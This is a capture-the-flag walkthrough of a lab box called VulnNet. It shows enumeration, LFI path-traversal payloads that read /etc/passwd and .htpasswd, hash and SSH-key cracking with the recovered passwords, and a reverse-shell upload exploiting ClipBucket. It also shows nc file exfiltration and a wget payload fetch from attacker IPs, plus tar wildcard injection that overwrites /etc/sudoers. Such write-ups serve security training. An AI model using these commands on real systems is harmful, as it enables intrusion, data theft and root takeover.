# VulnNet - Medium

* Map target IP to ```vulnnet.thm``` in ```/etc/hosts```

* ```nmap``` scan - ```nmap -T4 -p- -A -Pn -v vulnnet.thm```:

  * 22/tcp - ssh - OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  * 80/tcp - http - Apache httpd 2.4.29 ((Ubuntu))
  * 54420/tcp - filtered - unknown

* We can check basic enum tools like ```nikto``` and ```enum4linux``` but they don't help here

* We can start by web enumeration:

  ```shell
  gobuster dir -u http://vulnnet.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak -t 25
  # directory scanning

  ffuf -c -u "http://vulnnet.thm" -H "Host: FUZZ.vulnnet.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 25
  # subdomain enumeration

  # filter out the false positives
  ffuf -c -u "http://vulnnet.thm" -H "Host: FUZZ.vulnnet.thm" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 25 -s -fw 1689

  gobuster vhost -u http://vulnnet.thm -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
  # vhost enumeration
  ```

* Checking the page at port 80, we have '/login.html' for login functionality; we have a form on the main page but it does not work

* In '/login.html', we have a basic 'Sign In' form. There are options for 'Sign Up' and 'Forgot Password' but they don't work

* From the source code for both pages, we do have a couple of JS files but this can be checked later

* Directory scanning gives us some files - the folders have directory listing enabled thankfully. Interesting finds include '/js' (it includes some scripts) and '/LICENSE.txt'

* '/LICENSE.txt' mentions ```zlib.h```, version 1.2.11 - maybe this is related to an exploit, but we cannot confirm it at this stage

* Meanwhile from our subdomain & vhost enumeration, we get a subdomain "broadcast.vulnnet.thm" - add it to ```/etc/hosts```

* When we access "broadcast.vulnnet.thm", we get a basic HTTP auth form; as we don't have any credentials right now, we cannot consider bruteforce as first option

* Going back to the two scripts in '/js' directory, both of them seem extremely verbose as they're minified. In order to understand this, we can use online tools to deobfuscate or simplify JS code. I have decided to choose ChatGPT for this purpose (prompt - explain JS snippet and what it does for the mentioned domain):

  * ```index__7ed54732.js``` - this script seems to be setting up a chat service for the domain "broadcast.vulnnet.thm"
  * ```index__d8338055.js``` - this script is setting up functionality for an affiliate program service

* From the second script, we have a part of code ```"http://vulnnet.thm/index.php?referer="``` - this indicates we have a parameter 'referer' to test. We can try for fuzzing different values here:

  ```sh
  ffuf -w /usr/share/seclists/Fuzzing/UnixAttacks.fuzzdb.txt -u "http://vulnnet.thm/index.php?referer=FUZZ"
  # we can start with any wordlist
  # I chose this since web server is running Ubuntu
  # but ideally you would want to check with wordlists of multiple fuzzing types
  
  # run this once to identify the size to be filtered with

  ffuf -w /usr/share/seclists/Fuzzing/UnixAttacks.fuzzdb.txt -u "http://vulnnet.thm/index.php?referer=FUZZ" -fw 1689
  # we get a few hits
  ```

* On fuzzing values for parameter 'referer', we get a few hits like:

  * ```/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd```
  * ```/../../../../../../../../../../etc/passwd```
  * ```/./././././././././././etc/passwd```
  * ```/etc/passwd```

* The above indicates a LFI vulnerability. To confirm this, on navigating to <http://vulnnet.thm/index.php?referer=/etc/passwd>, we can see the file contents on viewing page source

* We can leverage LFI to get RCE - some techniques to be considered include PHP filters, PHP wrappers, remote file inclusion and log poisoning

* For our foothold, we can use log poisoning. Firstly, we need to find the path to a set of logs that can be poisoned:

  ```sh
  # we can use different wordlists from the LFI section
  # filtering with same number of words as before
  ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -u "http://vulnnet.thm/index.php?referer=FUZZ" -fw 1689

  ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://vulnnet.thm/index.php?referer=FUZZ" -fw 1689
  ```

* Some of the files found that we can read include ```/etc/apache2/apache2.conf```, ```etc/apache2/envvars```, ```/var/www/html/.htaccess```

* Furthermore, ```/etc/apache2/apache2.conf``` shows the server root is set to default ```/etc/apache2``` - we can search for sensitive files like ```.htaccess``` and ```.htpasswd``` here

* Reading the file ```/etc/apache2/.htpasswd``` gives us username & hash - "developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0"

* Knowing that ```.htpasswd``` is used for HTTP basic authentication, we can crack this hash and use it for the domain found earlier at 'broadcast.vulnnet.thm':

  ```sh
  # hashcat example hashes shows it is a Apache hash
  vim apachehash.txt

  hashcat -a 0 -m 1600 apachehash.txt /usr/share/wordlists/rockyou.txt
  # gives "9972761drmfsls"
  ```

* Using the above creds and logging into 'broadcast.vulnnet.thm', we get access to a page called 'ClipBucket'

* Basic enumeration shows we are running ClipBucket v4.0

* Upon Googling for exploits, we get a few exploits for this version before 4.0, release 4902; there is an [unauthenticated arbitrary file upload vulnerability](https://www.exploit-db.com/exploits/44250):

  ```sh
  vim reverse-shell.php
  # edit shell to include IP and port

  nc -nvlp 4444
  # start listener

  # we can follow one of the given cURL requests for unauthenticated arbitrary file upload
  curl -F "file=@reverse-shell.php" -F "plupload=1" -F "name=reverse-shell.php" "http://broadcast.vulnnet.thm/actions/beats_uploader.php"
  # this gives 401 Unauthorized, we will have to provide creds

  curl -F "file=@reverse-shell.php" -F "plupload=1" -F "name=reverse-shell.php" "http://broadcast.vulnnet.thm/actions/beats_uploader.php" -u 'developers:9972761drmfsls'
  # this shows success
  # also gives us uploaded file name and directory

  # access uploaded reverse shell
  curl "http://broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/171412763142d90e.php" -u 'developers:9972761drmfsls'
  ```

* We get a listener on our reverse shell now:

  ```sh
  id
  # www-data

  which python
  # we do not have python

  which python3
  # we have this, we can stabilize our shell now

  # for stable shell
  python3 -c 'import pty;pty.spawn("/bin/bash")'
  export TERM=xterm
  # Ctrl+Z now
  stty raw -echo; fg
  # press Enter key twice

  pwd
  
  ls -la /home/
  # we have a user called 'server-management'
  # but we cannot access that directory yet

  cd /tmp
  # we can attempt basic enum using Linpeas

  # start server in attacker machine and get linpeas.sh
  python3 -m http.server

  # in reverse shell
  wget http://10.65.14.87:8000/linpeas.sh

  chmod +x linpeas.sh

  ./linpeas.sh
  ```

* From the 'Backup files' output after running ```linpeas```, we have a file ```/var/backups/ssh-backup.tar.gz```, owned by the 'server-management' user - we can have a look at this:

  ```sh
  # in attacker machine
  nc -lvp 8888 > ssh-backup.tar.gz

  # in reverse shell
  cd /var/backups

  ls -la

  nc 10.14.78.65 8888 -w 3 < ssh-backup.tar.gz
  # this transfers file from victim to attacker machine

  # in attacker machine
  ls -la
  # we have file with same size now

  tar -xvzf ssh-backup.tar.gz
  # we get a id_rsa file

  ls -la id_rsa

  ssh server-management@vulnnet.thm -i id_rsa
  # this requires a passphrase
  # we can try cracking id_rsa

  ssh2john id_rsa > hash_id_rsa

  john --wordlist=/usr/share/wordlists/rockyou.txt hash_id_rsa
  # we get the passphrase "oneTWO3gOyac"

  ssh server-management@vulnnet.thm -i id_rsa
  # we can login with the cracked passphrase now
  ```

* Now that we have ssh access as 'server-management' user, we can get the user flag

* While doing basic enumeration, we have a couple of PDF files in the '/home/server-management-Documents' directory - we can have a look at it:

  ```sh
  scp -i id_rsa server-management@vulnnet.thm:/home/server-management/Documents/* /home/sv/vulnnet
  # transfer using scp from target SSH to attacker machine

  ls -la
  ```

* We do not get anything useful from these files, so we can consider running ```linpeas.sh``` once again for basic enumeration

* We have a cronjob running:

  ```sh
  cat /etc/crontab
  # running /var/opt/backupsrv.sh as root every 30 seconds

  cat /var/opt/backupsrv.sh
  # script to take a backup of the Documents folder
  # uses wildcard character
  ```

* As the script run in cronjob uses a wildcard for running ```tar```, we can exploit this using [tar wildcard injection](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/) -

  ```sh
  cd /home/server-management/Documents

  echo 'echo "server-management ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > runme.sh
  
  echo "" > "--checkpoint-action=exec=sh runme.sh"
  
  echo "" > --checkpoint=1

  # a minute later, we can run all commands as root
  sudo bash

  # we get root shell
  cat /root/root.txt
  # root flag
  ```
